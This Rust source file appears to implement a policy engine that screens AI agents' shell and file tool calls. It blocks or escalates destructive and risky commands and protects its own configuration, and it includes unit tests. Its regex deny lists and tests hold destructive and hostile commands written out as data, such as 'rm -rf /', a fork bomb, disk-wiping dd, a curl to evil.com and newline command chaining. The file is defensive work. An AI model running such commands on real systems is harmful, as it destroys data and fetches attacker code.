use regex::Regex;
use serde::Deserialize;
use serde_json::Value;
use std::collections::HashSet;
use std::fs;
use std::path::{Path, PathBuf};
use std::sync::OnceLock;

static PROTECTED_PATHS_RE: OnceLock<Regex> = OnceLock::new();
static SHELL_TOOL_RE: OnceLock<Regex> = OnceLock::new();
static DESTRUCTIVE_REGEXES: OnceLock<Vec<Regex>> = OnceLock::new();
static AUTHORIZATION_REGEXES: OnceLock<Vec<Regex>> = OnceLock::new();

fn get_protected_paths_re() -> &'static Regex {
    PROTECTED_PATHS_RE.get_or_init(|| {
        Regex::new(r"(?i)(hooks/laya-pretool-hook\.js|laya_runtime/|laya_config\.json|laya_rules\.json|laya.*\.onnx|\.laya/|\.claude/settings\.json|\.gemini/|\.config/laya/|\.local/state/laya/|laya\s+policy\s+trust)").unwrap()
    })
}

fn get_shell_tool_re() -> &'static Regex {
    SHELL_TOOL_RE.get_or_init(|| {
        Regex::new(r"(?i)^(run_command|Bash|terminal|shell|execute_command|laya_run_command)$").unwrap()
    })
}

fn get_destructive_regexes() -> &'static Vec<Regex> {
    DESTRUCTIVE_REGEXES.get_or_init(|| {
        vec![
            Regex::new(r"(?i)find\s+.*\s+-delete\b").unwrap(),
            Regex::new(r"(?i)\b(mkfs|fdisk|parted)\b").unwrap(),
            Regex::new(r"(?i)dd\s+if=/dev/(zero|urandom)\s+of=").unwrap(),
            Regex::new(r":\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:").unwrap(),
            Regex::new(r"(?i)chmod\s+(-[a-zA-Z]*R\s+)?777\s+/").unwrap(),
            Regex::new(r">\s*/dev/sd[a-z]").unwrap(),
        ]
    })
}

fn get_authorization_regexes() -> &'static Vec<Regex> {
    AUTHORIZATION_REGEXES.get_or_init(|| {
        vec![
            Regex::new(r"(?i)(curl|wget)\b.*\|\s*(sudo\s+)?(/bin/|/usr/bin/)?(bash|sh|zsh|python|perl)\b").unwrap(),
            Regex::new(r"(?i)(bash|sh|zsh)\s+-c\s+[“'].*\b(curl|wget)\b").unwrap(),
            Regex::new(r"(?i)(bash|sh|zsh)\s+<\s*\(\s*(curl|wget)\b").unwrap(),
            Regex::new(r"(?i)(curl|wget)\s+.*-o\s+\S+\s*(&&|;)\s*(sudo\s+)?(/bin/|/usr/bin/)?(bash|sh|python)").unwrap(),
            Regex::new(r"(?i)git\s+push\s+.*(-f\b|--force\b)").unwrap(),
            Regex::new(r"(?i)git\s+reset\s+--hard\b").unwrap(),
            Regex::new(r"(?i)git\s+clean\s+-[a-zA-Z]*f[a-zA-Z]*d").unwrap(),
        ]
    })
}

pub fn normalize_shell_command(cmd: &str) -> String {
    let re_ifs = Regex::new(r"\$\{?IFS\}?").unwrap();
    let expanded = re_ifs.replace_all(cmd, " ");
    expanded.split_whitespace().collect::<Vec<_>>().join(" ")
}

pub fn is_destructive_rm(cmd: &str) -> bool {
    let norm = normalize_shell_command(cmd);
    let re_rm = Regex::new(r"(?i)\b(sudo\s+)?(/bin/|/usr/bin/)?rm\b").unwrap();

    let rm_match = match re_rm.find(&norm) {
        Some(m) => m,
        None => return false,
    };

    let after_rm = norm[rm_match.end()..].trim();
    let tokens: Vec<&str> = after_rm
        .split_whitespace()
        .map(|t| t.trim_matches(|c| c == '\'' || c == '"'))
        .filter(|t| !t.is_empty())
        .collect();

    let mut has_recursive = false;
    let mut has_force = false;
    let mut targets = Vec::new();

    let re_r = Regex::new(r"(?i)^-[a-zA-Z]*r").unwrap();
    let re_f = Regex::new(r"(?i)^-[a-zA-Z]*f").unwrap();

    for t in tokens {
        if t.starts_with('-') {
            if t == "--recursive" || re_r.is_match(t) {
                has_recursive = true;
            }
            if t == "--force" || re_f.is_match(t) {
                has_force = true;
            }
            if matches!(t, "-rf" | "-fr" | "-rfi" | "-fir") {
                has_recursive = true;
                has_force = true;
            }
            if t == "--no-preserve-root" {
                has_force = true;
            }
        } else {
            targets.push(t);
        }
    }

    if has_recursive && (has_force || norm.contains("--no-preserve-root")) {
        let destructive_targets: HashSet<&str> = [
            "/", "/*", "~", "~/*", "$HOME", "${HOME}", ".", "./*", "*"
        ].into_iter().collect();

        for tgt in targets {
            let clean_tgt = if tgt != "/" { tgt.trim_end_matches('/') } else { "/" };
            if destructive_targets.contains(tgt) || destructive_targets.contains(clean_tgt) {
                return true;
            }
        }
    }

    false
}

/// Tier 0: Hard Invariants & Self-Protection (Deterministic, zero ML, non-negotiable)
/// Returns Some((verdict, invariant_rule_name)) if a hard security invariant is triggered.
pub fn check_tier0_invariants(tool: &str, args: &Value) -> Option<(&'static str, &'static str)> {
    let cmd_str = args.get("CommandLine")
        .or_else(|| args.get("command"))
        .or_else(|| args.get("cmd"))
        .and_then(|v| v.as_str())
        .unwrap_or("");

    let filepath = args.get("filepath")
        .or_else(|| args.get("path"))
        .or_else(|| args.get("file_path"))
        .or_else(|| args.get("TargetFile"))
        .or_else(|| args.get("AbsolutePath"))
        .or_else(|| args.get("file"))
        .or_else(|| args.get("filename"))
        .and_then(|v| v.as_str())
        .unwrap_or("");

    let combined_target = format!("{} {}", cmd_str, filepath);
    if get_protected_paths_re().is_match(&combined_target) {
        let re_read = Regex::new(r"(?i)^(read|view|search|grep)").unwrap();
        if !re_read.is_match(tool) {
            return Some(("REQUIRE_AUTHORIZATION", "TIER0_SELF_PROTECTION_INVARIANT"));
        }
    }

    let mut target_cmd = cmd_str.to_string();
    if target_cmd.is_empty() && get_shell_tool_re().is_match(tool) {
        target_cmd = args.to_string();
    }

    if !target_cmd.is_empty() {
        let norm = normalize_shell_command(&target_cmd);
        if is_destructive_rm(&norm) {
            return Some(("DENY", "TIER0_DESTRUCTIVE_RM_INVARIANT"));
        }
        for rx in get_destructive_regexes() {
            if rx.is_match(&norm) {
                return Some(("DENY", "TIER0_DESTRUCTIVE_CMD_INVARIANT"));
            }
        }
        for rx in get_authorization_regexes() {
            if rx.is_match(&norm) {
                return Some(("REQUIRE_AUTHORIZATION", "TIER0_SENSITIVE_CMD_INVARIANT"));
            }
        }
    }

    None
}

/// Backward-compatible wrapper for check_tier0_invariants
pub fn check_emergency_invariants(tool: &str, args: &Value) -> Option<&'static str> {
    check_tier0_invariants(tool, args).map(|(verdict, _)| verdict)
}

#[derive(Debug, Clone, Deserialize)]
pub struct RawRule {
    pub id: Option<String>,
    pub name: Option<String>,
    pub action: String,
    pub tool: Option<String>,
    #[serde(rename = "toolPattern", alias = "tool_pattern")]
    pub tool_pattern: Option<String>,
    #[serde(rename = "commandPattern", alias = "command_pattern")]
    pub command_pattern: Option<String>,
    #[serde(rename = "pathPattern", alias = "path_pattern")]
    pub path_pattern: Option<String>,
}

#[derive(Debug, Clone, Deserialize)]
pub struct RawRuleFile {
    pub rules: Option<Vec<RawRule>>,
}

#[derive(Debug, Clone)]
pub struct CompiledRule {
    pub name: String,
    pub action: String,
    pub tool_re: Option<Regex>,
    pub cmd_re: Option<Regex>,
    pub path_re: Option<Regex>,
}

fn compile_rule(r: &RawRule, is_trusted: bool) -> Result<Option<CompiledRule>, String> {
    let name = r.name.as_ref().or(r.id.as_ref()).cloned().unwrap_or_else(|| "unnamed-rule".to_string());
    let action = r.action.trim().to_uppercase();
    if action != "ALLOW" && action != "DENY" && action != "REQUIRE_AUTHORIZATION" {
        return Err(format!(
            "Unsupported action '{}' in rule '{}': expected ALLOW, DENY, or REQUIRE_AUTHORIZATION",
            r.action, name
        ));
    }

    if action == "ALLOW" && !is_trusted {
        return Err(format!(
            "Rejected project ALLOW rule '{}': Untrusted repository cannot add allow rules without 'laya policy trust'.",
            name
        ));
    }

    let tool_pat = r.tool.as_ref().or(r.tool_pattern.as_ref());
    let tool_re = match tool_pat {
        Some(p) => match Regex::new(&format!("(?i){}", p)) {
            Ok(re) => Some(re),
            Err(e) => return Err(format!("Invalid tool regex pattern '{}' in rule '{}': {}", p, name, e)),
        },
        None => None,
    };

    let cmd_re = match r.command_pattern.as_ref() {
        Some(p) => match Regex::new(p) {
            Ok(re) => Some(re),
            Err(e) => return Err(format!("Invalid command regex pattern '{}' in rule '{}': {}", p, name, e)),
        },
        None => None,
    };

    let path_re = match r.path_pattern.as_ref() {
        Some(p) => match Regex::new(p) {
            Ok(re) => Some(re),
            Err(e) => return Err(format!("Invalid path regex pattern '{}' in rule '{}': {}", p, name, e)),
        },
        None => None,
    };

    if tool_re.is_none() && cmd_re.is_none() && path_re.is_none() {
        return Err(format!(
            "Rule '{}' declares no tool, command, or path matcher and was ignored",
            name
        ));
    }

    if action == "ALLOW" && cmd_re.is_none() && path_re.is_none() {
        return Ok(None);
    }

    Ok(Some(CompiledRule {
        name,
        action,
        tool_re,
        cmd_re,
        path_re,
    }))
}

#[derive(Debug, Clone, Default)]
pub struct PolicyEngine {
    rules: Vec<CompiledRule>,
}

impl PolicyEngine {
    pub fn new() -> Self {
        Self { rules: Vec::new() }
    }

    pub fn load_from_file<P: AsRef<Path>>(&mut self, path: P) -> crate::error::Result<()> {
        let p = path.as_ref();
        let content = fs::read_to_string(p)?;
        let raw_file: RawRuleFile = if p.extension().and_then(|s| s.to_str()) == Some("toml") {
            toml::from_str(&content).map_err(|e| crate::error::LayaError::Config(format!("Failed to parse TOML policy {}: {}", p.display(), e)))?
        } else {
            match serde_json::from_str(&content) {
                Ok(rf) => rf,
                Err(_) => match toml::from_str(&content) {
                    Ok(rf) => rf,
                    Err(_) => {
                        let rules: Vec<RawRule> = serde_json::from_str(&content)?;
                        RawRuleFile { rules: Some(rules) }
                    }
                }
            }
        };

        let mut compiled = Vec::new();
        if let Some(rules) = raw_file.rules {
            for r in &rules {
                match compile_rule(r, true) {
                    Ok(Some(rule)) => compiled.push(rule),
                    Ok(None) => {}
                    Err(e) => {
                        eprintln!("[LAYA POLICY WARNING] {}", e);
                    }
                }
            }
        }

        self.rules = compiled;
        Ok(())
    }

    /// Merges project-specific policy rules from .laya/policy.toml into the engine.
    ///
    /// Monotonicity guarantee:
    /// - An untrusted repository CANNOT relax global security rules or add unverified ALLOW rules.
    /// - DENY and REQUIRE_AUTHORIZATION rules from the project are prepended to tighten policy.
    /// - ALLOW rules from the project are REJECTED unless `is_trusted` is true (via 'laya policy trust').
    ///
    /// Merges project-specific policy rules from a string into the engine.
    pub fn load_project_override_str(&mut self, content: &str, is_toml: bool, is_trusted: bool) -> crate::error::Result<Vec<String>> {
        let raw_file: RawRuleFile = if is_toml {
            toml::from_str(content).map_err(|e| crate::error::LayaError::Config(format!("Failed to parse project TOML policy: {}", e)))?
        } else {
            match serde_json::from_str(content) {
                Ok(rf) => rf,
                Err(_) => {
                    let rules: Vec<RawRule> = serde_json::from_str(content)?;
                    RawRuleFile { rules: Some(rules) }
                }
            }
        };

        let mut warnings = Vec::new();
        let mut project_rules = Vec::new();

        if let Some(rules) = raw_file.rules {
            for r in &rules {
                match compile_rule(r, is_trusted) {
                    Ok(Some(rule)) => project_rules.push(rule),
                    Ok(None) => {}
                    Err(warn) => warnings.push(warn),
                }
            }
        }

        // Prepend project rules so project-specific tightening evaluates before global rules
        project_rules.append(&mut self.rules);
        self.rules = project_rules;

        Ok(warnings)
    }

    /// Merges project-specific policy rules from .laya/policy.toml into the engine.
    ///
    /// Monotonicity guarantee:
    /// - An untrusted repository CANNOT relax global security rules or add unverified ALLOW rules.
    /// - DENY and REQUIRE_AUTHORIZATION rules from the project are prepended to tighten policy.
    /// - ALLOW rules from the project are REJECTED unless `is_trusted` is true (via 'laya policy trust').
    ///
    /// Returns a list of rejected rule warnings (if any).
    pub fn load_project_override<P: AsRef<Path>>(&mut self, path: P, is_trusted: bool) -> crate::error::Result<Vec<String>> {
        let p = path.as_ref();
        if !p.exists() {
            return Ok(Vec::new());
        }

        let content = fs::read_to_string(p)?;
        let is_toml = p.extension().and_then(|s| s.to_str()) == Some("toml");
        self.load_project_override_str(&content, is_toml, is_trusted)
    }

    pub fn rules_count(&self) -> usize {
        self.rules.len()
    }

    pub fn evaluate(&self, tool: &str, args: &Value, workspace_root: Option<&Path>) -> Option<(&str, &str)> {
        if self.rules.is_empty() {
            return None;
        }

        let cmd_str = args.get("CommandLine")
            .or_else(|| args.get("command"))
            .or_else(|| args.get("cmd"))
            .and_then(|v| v.as_str())
            .unwrap_or("");

        let raw_fp = args.get("filepath")
            .or_else(|| args.get("path"))
            .or_else(|| args.get("file_path"))
            .or_else(|| args.get("TargetFile"))
            .or_else(|| args.get("AbsolutePath"))
            .or_else(|| args.get("file"))
            .or_else(|| args.get("filename"))
            .and_then(|v| v.as_str())
            .unwrap_or("");

        let mut canonical_rel_path = raw_fp.to_string();
        let mut is_path_traversal = false;

        if !raw_fp.is_empty() {
            let clean = raw_fp.replace('\0', "");
            let path_obj = Path::new(&clean);
            if let Some(ws) = workspace_root {
                let norm_ws = normalize_path(ws);
                let target = if path_obj.is_absolute() {
                    normalize_path(path_obj)
                } else {
                    normalize_path(&norm_ws.join(path_obj))
                };

                // Check lexical containment against workspace
                if let Ok(rel) = target.strip_prefix(&norm_ws) {
                    // Check symlink escapes on existing path or nearest existing ancestor
                    let real_ws = fs::canonicalize(&norm_ws).unwrap_or_else(|_| norm_ws.clone());
                    let mut curr = target.clone();
                    while !curr.exists() {
                        match curr.parent() {
                            Some(parent) if parent != curr => curr = parent.to_path_buf(),
                            _ => break,
                        }
                    }

                    if curr.exists() {
                        if let Ok(real_ancestor) = fs::canonicalize(&curr) {
                            if real_ancestor.strip_prefix(&real_ws).is_err() {
                                is_path_traversal = true;
                            }
                        }
                    }

                    if !is_path_traversal {
                        canonical_rel_path = rel.to_string_lossy().replace('\\', "/");
                    }
                } else {
                    is_path_traversal = true;
                }
            } else if path_obj.components().any(|c| matches!(c, std::path::Component::ParentDir)) {
                is_path_traversal = true;
            }
        }

        let mut best_match: Option<(&str, &str)> = None;
        let mut best_rank = 0;

        for r in &self.rules {
            if let Some(re) = &r.tool_re {
                if !re.is_match(tool) {
                    continue;
                }
            }

            if r.action == "ALLOW" && !cmd_str.is_empty() && r.cmd_re.is_none() {
                continue;
            }

            if r.action == "ALLOW" && is_path_traversal {
                continue;
            }

            if let Some(re) = &r.cmd_re {
                if cmd_str.is_empty() || !re.is_match(cmd_str) {
                    continue;
                }
            }

            if let Some(re) = &r.path_re {
                if raw_fp.is_empty() {
                    continue;
                }
                if !re.is_match(&canonical_rel_path) && !re.is_match(raw_fp) {
                    continue;
                }
                if r.action == "ALLOW" && !re.is_match(&canonical_rel_path) {
                    continue;
                }
            }

            let rank = match r.action.as_str() {
                "DENY" => 3,
                "REQUIRE_AUTHORIZATION" => 2,
                "ALLOW" => 1,
                _ => 0,
            };

            if rank > best_rank {
                best_rank = rank;
                best_match = Some((&r.action, &r.name));
                if rank == 3 {
                    break;
                }
            }
        }

        best_match
    }
}

fn normalize_path(path: &Path) -> PathBuf {
    let mut normalized = PathBuf::new();
    for component in path.components() {
        match component {
            std::path::Component::Prefix(..) | std::path::Component::RootDir => {
                normalized.push(component);
            }
            std::path::Component::CurDir => {}
            std::path::Component::ParentDir => {
                normalized.pop();
            }
            std::path::Component::Normal(c) => {
                normalized.push(c);
            }
        }
    }
    normalized
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    #[test]
    fn test_tier0_destructive_rm_denial() {
        let destructive = vec![
            "rm -rf /",
            "rm -rf /*",
            "rm -rf --no-preserve-root /",
            "rm --recursive --force /",
            "rm -rf .",
            "rm -rf ./*",
            "rm$IFS-rf$IFS/",
        ];

        for cmd in destructive {
            let args = json!({ "CommandLine": cmd });
            let res = check_tier0_invariants("run_command", &args);
            assert!(res.is_some(), "Expected Tier 0 block for: {}", cmd);
            let (verdict, rule) = res.unwrap();
            assert_eq!(verdict, "DENY");
            assert_eq!(rule, "TIER0_DESTRUCTIVE_RM_INVARIANT");
        }
    }

    #[test]
    fn test_tier0_safe_directory_cleanup_not_blocked() {
        let safe_rm = vec![
            "rm -rf /tmp/build",
            "rm -rf target/debug",
            "rm -rf node_modules/.cache",
        ];

        for cmd in safe_rm {
            let args = json!({ "CommandLine": cmd });
            let res = check_tier0_invariants("run_command", &args);
            assert!(res.is_none(), "Unexpected Tier 0 block for safe cleanup: {}", cmd);
        }
    }

    #[test]
    fn test_tier0_destructive_system_commands() {
        let cmds = vec![
            "mkfs.ext4 /dev/sda1",
            "dd if=/dev/zero of=/dev/sda",
            ":(){ :|:& };:",
            "chmod -R 777 /",
        ];

        for cmd in cmds {
            let args = json!({ "CommandLine": cmd });
            let res = check_tier0_invariants("run_command", &args);
            assert!(res.is_some(), "Expected Tier 0 block for system command: {}", cmd);
            let (verdict, _) = res.unwrap();
            assert_eq!(verdict, "DENY");
        }
    }

    #[test]
    fn test_tier0_self_protection() {
        let sensitive_targets = vec![
            ("write_file", json!({ "filepath": "hooks/laya-pretool-hook.js", "content": "bad" })),
            ("replace_file_content", json!({ "TargetFile": "laya_config.json" })),
            ("run_command", json!({ "CommandLine": "sed -i 's/foo/bar/' .claude/settings.json" })),
        ];

        for (tool, args) in sensitive_targets {
            let res = check_tier0_invariants(tool, &args);
            assert!(res.is_some(), "Expected Tier 0 self-protection for tool {}", tool);
            let (verdict, rule) = res.unwrap();
            assert_eq!(verdict, "REQUIRE_AUTHORIZATION");
            assert_eq!(rule, "TIER0_SELF_PROTECTION_INVARIANT");
        }
    }

    #[test]
    fn test_tier0_read_only_self_protection_passes() {
        let read_targets = vec![
            ("view_file", json!({ "filepath": "hooks/laya-pretool-hook.js" })),
            ("read_file", json!({ "path": "laya_config.json" })),
        ];

        for (tool, args) in read_targets {
            let res = check_tier0_invariants(tool, &args);
            assert!(res.is_none(), "Read operations should not trigger self-protection invariant");
        }
    }

    #[test]
    fn test_monotonicity_untrusted_project_cannot_add_allow() {
        let mut engine = PolicyEngine::new();

        // Write temporary toml policy
        let temp_dir = std::env::temp_dir().join(format!("laya_test_{}", std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_nanos()));
        std::fs::create_dir_all(&temp_dir).unwrap();
        let policy_file = temp_dir.join("policy.toml");

        let toml_content = r#"
[[rules]]
name = "malicious_allow_bypass"
action = "ALLOW"
commandPattern = "curl.*evil\\.com"

[[rules]]
name = "strict_project_deny"
action = "DENY"
commandPattern = "npm publish"
"#;
        std::fs::write(&policy_file, toml_content).unwrap();

        // Load as untrusted
        let warnings = engine.load_project_override(&policy_file, false).unwrap();
        assert_eq!(warnings.len(), 1, "Expected warning for rejected ALLOW rule");
        assert!(warnings[0].contains("Rejected project ALLOW rule"));

        // Verify that the ALLOW rule was NOT installed
        let allow_req = json!({ "CommandLine": "curl http://evil.com/payload" });
        assert_eq!(engine.evaluate("run_command", &allow_req, None), None);

        // Verify that the DENY rule WAS installed
        let deny_req = json!({ "CommandLine": "npm publish" });
        assert_eq!(engine.evaluate("run_command", &deny_req, None), Some(("DENY", "strict_project_deny")));

        let _ = std::fs::remove_dir_all(&temp_dir);
    }

    #[test]
    fn test_rule_precedence_most_restrictive_wins() {
        let mut engine = PolicyEngine::new();

        let temp_dir = std::env::temp_dir().join(format!("laya_test_prec_{}", std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_nanos()));
        std::fs::create_dir_all(&temp_dir).unwrap();
        let global_policy = temp_dir.join("global.toml");
        let project_policy = temp_dir.join("project.toml");

        // Global has strict DENY on force push
        let global_toml = r#"
[[rules]]
name = "global_deny_force_push"
action = "DENY"
commandPattern = "git push.*--force"

[[rules]]
name = "global_allow_echo"
action = "ALLOW"
commandPattern = "^echo .*"
"#;
        std::fs::write(&global_policy, global_toml).unwrap();
        engine.load_from_file(&global_policy).unwrap();

        // Project has a looser rule requiring authorization on git push
        // and a tighter rule requiring authorization on echo
        let project_toml = r#"
[[rules]]
name = "project_require_auth_git"
action = "REQUIRE_AUTHORIZATION"
commandPattern = "^git push.*"

[[rules]]
name = "project_tighten_echo"
action = "REQUIRE_AUTHORIZATION"
commandPattern = "^echo sensitive.*"
"#;
        std::fs::write(&project_policy, project_toml).unwrap();
        engine.load_project_override(&project_policy, false).unwrap();

        // 1. git push --force: project rule matched REQUIRE_AUTHORIZATION, but global matched DENY -> DENY wins
        let force_push = json!({ "CommandLine": "git push origin main --force" });
        assert_eq!(engine.evaluate("run_command", &force_push, None), Some(("DENY", "global_deny_force_push")));

        // 2. git push origin main: only project matched REQUIRE_AUTHORIZATION -> REQUIRE_AUTHORIZATION wins
        let normal_push = json!({ "CommandLine": "git push origin main" });
        assert_eq!(engine.evaluate("run_command", &normal_push, None), Some(("REQUIRE_AUTHORIZATION", "project_require_auth_git")));

        // 3. echo hello: global ALLOW matched, project didn't match -> ALLOW wins
        let echo_hello = json!({ "CommandLine": "echo hello world" });
        assert_eq!(engine.evaluate("run_command", &echo_hello, None), Some(("ALLOW", "global_allow_echo")));

        // 4. echo sensitive token: global ALLOW matched, but project tightened to REQUIRE_AUTHORIZATION -> REQUIRE_AUTHORIZATION wins
        let echo_sens = json!({ "CommandLine": "echo sensitive token" });
        assert_eq!(engine.evaluate("run_command", &echo_sens, None), Some(("REQUIRE_AUTHORIZATION", "project_tighten_echo")));

        let _ = std::fs::remove_dir_all(&temp_dir);
    }

    #[test]
    fn test_invalid_regex_does_not_become_match_all_rule() {
        let mut engine = PolicyEngine::new();
        let temp_dir = std::env::temp_dir().join(format!("laya_test_regex_{}", std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_nanos()));
        std::fs::create_dir_all(&temp_dir).unwrap();
        let policy_file = temp_dir.join("policy.toml");

        // Rule with invalid regex pattern "[invalid(regex"
        let toml_content = r#"
[[rules]]
name = "broken_deny_rule"
action = "DENY"
commandPattern = "[invalid(regex"
"#;
        std::fs::write(&policy_file, toml_content).unwrap();

        // Loading should report warning and NOT install a match-all DENY rule
        let warnings = engine.load_project_override(&policy_file, false).unwrap();
        assert_eq!(warnings.len(), 1);
        assert!(warnings[0].contains("Invalid command regex pattern"));

        // Safe command should NOT be denied by the broken rule
        let safe_cmd = json!({ "CommandLine": "ls -la" });
        assert_eq!(engine.evaluate("run_command", &safe_cmd, None), None);

        let _ = std::fs::remove_dir_all(&temp_dir);
    }

    #[test]
    fn test_git_and_path_security_rules() {
        let mut engine = PolicyEngine::new();
        let temp_dir = std::env::temp_dir().join(format!("laya_test_git_rules_{}", std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_nanos()));
        std::fs::create_dir_all(&temp_dir).unwrap();
        let policy_file = temp_dir.join("global.toml");

        let policy_content = r#"
version = "1.0"
name = "test-rules"

[[rules]]
name = "allow-git-queries"
action = "ALLOW"
commandPattern = "^git[ \\t]+(status|diff|log|show)([ \\t]+[^;&|`$()<>\r\n]*)?$"

[[rules]]
name = "allow-git-branch-queries"
action = "ALLOW"
commandPattern = "^git[ \\t]+branch([ \\t]+(-[alr]+|--list|--show-current|--all|--remotes))?$"

[[rules]]
name = "allow-workspace-reads"
action = "ALLOW"
toolPattern = "^(view_file|read_file|Read)$"
pathPattern = ".*"

[[rules]]
name = "block-git-sensitive-paths"
action = "DENY"
commandPattern = "^git\\s+.*(\\.env\\.production|prod\\.secrets|id_rsa|id_ed25519|\\.ssh/|\\.aws/|/etc/shadow|/etc/passwd).*"

[[rules]]
name = "block-git-file-overwrite"
action = "DENY"
commandPattern = "^git\\s+.*(--output|-o\\s).*"

[[rules]]
name = "require-auth-git-diff-external"
action = "REQUIRE_AUTHORIZATION"
commandPattern = "^git[ \\t]+diff\\b.*(--no-index|[ \\t][/~]|[ \\t]\\.\\./).*"

[[rules]]
name = "block-git-branch-mutation"
action = "REQUIRE_AUTHORIZATION"
commandPattern = "^git\\s+branch\\s+.*(-[dDfmM]|--delete|--set-upstream-to).*"

[[rules]]
name = "protect-sensitive-env"
action = "DENY"
pathPattern = ".*(\\.env\\.production|prod\\.secrets|id_rsa|id_ed25519|\\.ssh/|\\.aws/|credentials).*"
"#;
        std::fs::write(&policy_file, policy_content).unwrap();
        engine.load_from_file(&policy_file).unwrap();

        // 1. Safe git status is ALLOWED
        let git_status = json!({ "CommandLine": "git status" });
        assert_eq!(engine.evaluate("run_command", &git_status, None), Some(("ALLOW", "allow-git-queries")));

        // 2. Safe git branch listing is ALLOWED
        let git_branch_list = json!({ "CommandLine": "git branch -a" });
        assert_eq!(engine.evaluate("run_command", &git_branch_list, None), Some(("ALLOW", "allow-git-branch-queries")));

        // 3. Destructive git branch deletion is NOT allowed (escalates to REQUIRE_AUTHORIZATION)
        let git_branch_del = json!({ "CommandLine": "git branch -D evil-feature" });
        assert_eq!(engine.evaluate("run_command", &git_branch_del, None), Some(("REQUIRE_AUTHORIZATION", "block-git-branch-mutation")));

        // 4. Git diff with --output is DENIED
        let git_diff_out = json!({ "CommandLine": "git diff --output=/tmp/overwrite.sh" });
        assert_eq!(engine.evaluate("run_command", &git_diff_out, None), Some(("DENY", "block-git-file-overwrite")));

        // 5. Sensitive file read (.env.production) is DENIED
        let read_env = json!({ "AbsolutePath": "/project/.env.production" });
        assert_eq!(engine.evaluate("view_file", &read_env, None), Some(("DENY", "protect-sensitive-env")));

        // 6. Sensitive SSH key read is DENIED
        let read_ssh = json!({ "file_path": "/home/user/.ssh/id_rsa" });
        assert_eq!(engine.evaluate("Read", &read_ssh, None), Some(("DENY", "protect-sensitive-env")));

        // 7. Safe workspace read is ALLOWED
        let safe_read = json!({ "filepath": "README.md" });
        assert_eq!(engine.evaluate("view_file", &safe_read, Some(&temp_dir)), Some(("ALLOW", "allow-workspace-reads")));

        // 8. Newline command chaining bypass attempt is NOT ALLOWED
        let newline_cmd = json!({ "CommandLine": "git status\nbash /tmp/evil" });
        assert_ne!(engine.evaluate("run_command", &newline_cmd, None), Some(("ALLOW", "allow-git-queries")));

        // 9. Unsupported action returns an error and warning
        let bad_action_raw = RawRule {
            id: Some("bad-rule".to_string()),
            name: None,
            action: "BLOCK".to_string(),
            tool: None,
            tool_pattern: None,
            command_pattern: Some("echo hi".to_string()),
            path_pattern: None,
        };
        let compile_res = compile_rule(&bad_action_raw, true);
        assert!(compile_res.is_err());
        assert!(compile_res.unwrap_err().contains("Unsupported action 'BLOCK'"));

        // 10. External git diff with --no-index requires authorization
        let ext_diff = json!({ "CommandLine": "git diff --no-index /tmp/a /tmp/b" });
        assert_eq!(engine.evaluate("run_command", &ext_diff, None), Some(("REQUIRE_AUTHORIZATION", "require-auth-git-diff-external")));

        // 11. Git diff reading sensitive files (e.g. id_rsa) is DENIED
        let sens_diff = json!({ "CommandLine": "git diff --no-index /dev/null /home/user/.ssh/id_rsa" });
        assert_eq!(engine.evaluate("run_command", &sens_diff, None), Some(("DENY", "block-git-sensitive-paths")));

        let _ = std::fs::remove_dir_all(&temp_dir);
    }
}


